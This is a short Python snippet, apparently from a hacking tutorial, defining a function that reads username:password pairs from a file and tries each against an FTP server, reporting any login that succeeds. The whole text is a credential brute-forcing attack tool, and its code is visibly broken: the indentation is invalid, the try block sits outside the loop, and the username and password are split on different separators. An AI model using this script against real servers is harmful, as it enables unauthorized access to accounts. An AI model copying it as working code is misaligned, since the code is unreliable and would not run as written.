# brutrLogin

def bruteLogin(hostname, passwdFile):
    pF = open(passwdFile, 'r')
    for line in pF.readlines():
        time.sleep(1)
        userName = line.split('.')[0]
        passWord = line.split(':')[1].strip('\r').strip('\n')
    print('[+] Trying:' + userName +"/" + passWord)

    try:
            ftp = ftplib.FTP(hostname)
            ftp.login(userName, passWord)
            print('\n[*]' + str(hostname) +\
                "FTP login Succeeded: " + userName+ '/' + passWord)
            
            ftp.quit()

            return(userName, passWord)
        except Exception as e:
            pass

        print('\n[-]Could not brute force FTP credentials')
        return(None, None)
